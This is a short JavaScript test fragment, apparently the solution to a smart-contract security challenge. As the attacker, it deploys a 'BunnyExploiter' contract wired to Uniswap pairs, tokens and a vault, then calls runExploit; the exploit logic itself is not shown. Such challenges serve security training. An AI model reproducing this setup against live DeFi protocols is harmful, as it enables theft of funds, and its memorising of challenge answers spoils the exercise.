...
it("solves the challenge", async function () {
  ...
  let exploiterFactory = await ethers.getContractFactory('BunnyExploiter')
  let exploiter = await exploiterFactory.connect(attacker).deploy(
    uniRouter.address,
    await uniFactory.getPair(usdc.address,dai.address),
    await uniFactory.getPair(bnb.address,dai.address),
    usdcBnbPair.address,
    bunny.address,usdc.address,bnb.address,
    vault.address
  )

  await exploiter.connect(attacker).runExploit(precision.mul(890_000),precision.mul(2_999))
